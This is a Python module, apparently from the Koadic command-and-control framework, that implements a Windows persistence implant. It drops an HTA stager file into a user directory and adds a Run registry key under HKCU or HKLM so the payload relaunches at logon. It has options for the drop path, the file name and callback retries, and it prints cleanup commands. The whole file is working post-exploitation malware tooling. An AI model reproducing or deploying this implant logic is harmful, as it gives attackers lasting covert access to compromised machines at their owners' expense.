import core.job
import core.implant
import core.loader
import uuid
import string
import random

class RegistryJob(core.job.Job):

    def create(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)
        self.options.set("CMD", payload)
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
        self.options.set("FDROPDIR", self.options.get('DROPDIR').replace("\\", "\\\\").replace('"', '\\"'))

        if self.options.get('DROPFILE'):
            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')
        else:
            self.options.set('DROPFILE', ''.join(random.choice(string.ascii_uppercase) for _ in range(10)))
            self.options.set('FDROPFILE', self.options.get('DROPFILE')+'.hta')

        self.options.set("FHKEY", "Koadic.registry."+self.options.get("HKEY"))
        if self.session_id == -1:
            self.error("0", "This job is not yet compatible with ONESHOT stagers.", "ONESHOT job error", "")
            return False

    def report(self, handler, data, sanitize = False):
        task = handler.get_header("Task", False)
        upload = handler.get_header('X-UploadFileJob', False)
        if upload == "true":
            dropper_script = core.loader.load_script(self.options.get("LDROPFILE"), self.options)
            template = core.loader.load_script("data/stager/js/mshta/template.hta")
            fdata = self.linter.post_process_script(dropper_script, template, self.options, self.session, False)

            headers = {}
            headers['Content-Type'] = 'application/octet-stream'
            headers['Content-Length'] = len(fdata)
            handler.reply(200, fdata, headers)
            return

        data = data.decode()

        if task == "AddKey":
            handler.reply(200)
            if data:
                self.shell.print_good("K0adic key added to registry.")
                self.shell.print_command("reg delete "+self.options.get("HKEY")+"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v K0adic /f")
            else:
                self.shell.print_error("Could not add key to registry.")
            return

        if task == "DeleteKey":
            handler.reply(200)
            if "The operation completed successfully." in data:
                self.shell.print_good("Key was removed.")
            else:
                self.shell.print_error("Key could not be removed.")
                self.shell.print_command("reg delete "+self.options.get("HKEY")+"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v K0adic /f")
            return

        if task == "AddDropper":
            handler.reply(200)
            if "true" in data.split("~~~")[0]:
                self.shell.print_good("HTA file dropped at "+data.split("~~~")[1].split()[0])
                self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
            else:
                self.shell.print_error("HTA file could not be dropped. Consider cleaning up and choosing a different DROPDIR.")
            return

        if task == "DeleteDropper":
            handler.reply(200)
            if "false" in data.split("~~~")[0]:
                self.shell.print_good("HTA file deleted from "+data.split("~~~")[1].split()[0])
            else:
                self.shell.print_error("HTA file could not be deleted.")
                self.shell.print_command("del /f "+data.split("~~~")[1].split()[0])
            return


        if data == "Complete":
            super(RegistryJob, self).report(handler, data)

        handler.reply(200)

    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        # self.shell.print_plain(self.data)
        pass

class RegistryImplant(core.implant.Implant):

    NAME = "Add Registry Payload"
    DESCRIPTION = "Adds a Koadic stager payload in the registry."
    AUTHORS = ["TheNaterz"]
    STATE = "implant/persist/registry"

    def load(self):
        self.options.register("PAYLOAD", "", "payload to stage")
        self.options.register("CMD", "", "command", hidden=True)
        self.options.register("CLEANUP", "false", "will remove the registry key", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
        self.options.register("LDROPFILE", "data/implant/persist/registry.dropper", "local file to drop on the target", advanced=True)
        self.options.register("DROPDIR", "%APPDATA%", "directory to place the drop file", advanced=True)
        self.options.register("FDROPDIR", "", "", hidden=True)
        self.options.register("RETRYATTEMPTS", "5", "number of times to retry calling back before self-terminating (-1 == infinite)")
        self.options.register("RETRYDELAY", "60", "seconds between retry attempts")
        self.options.register("DROPFILE", "", "name to give the drop file (randomly generated if no name)", advanced=True)
        self.options.register("FDROPFILE", "", "", hidden=True)
        self.options.register("HKEY", "HKCU", "top level registry key to place payload (HKLM does not cleanup with self-termination, use only if you know what you're doing)", enum=["HKCU", "HKLM"], advanced=True)
        self.options.register("FHKEY", "", "", hidden=True)

    def job(self):
        return RegistryJob

    def run(self):
        id = self.options.get("PAYLOAD")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("Payload %s not found." % id)
            return

        payloads = {}
        payloads["js"] = "data/implant/persist/registry.js"

        self.dispatch(payloads, self.job)
